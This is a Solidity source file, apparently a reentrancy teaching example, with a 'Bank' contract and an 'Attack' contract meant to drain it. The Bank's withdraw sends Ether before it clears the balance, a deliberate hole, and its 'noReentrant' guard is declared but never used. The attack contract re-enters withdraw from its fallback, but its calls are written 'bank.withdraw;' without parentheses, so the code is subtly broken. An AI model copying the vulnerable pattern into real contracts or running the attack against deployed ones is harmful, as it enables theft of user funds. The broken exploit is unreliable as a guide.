// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// check
// update state
// external call

contract Bank {
    mapping(address => uint) public balances;
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "NO NO");
        locked = true;
        _;
        locked = false;
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }
}

contract Attack {
    Bank public bank;

    constructor(Bank _bankAddress) {
        bank = _bankAddress;
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw;
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw;
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}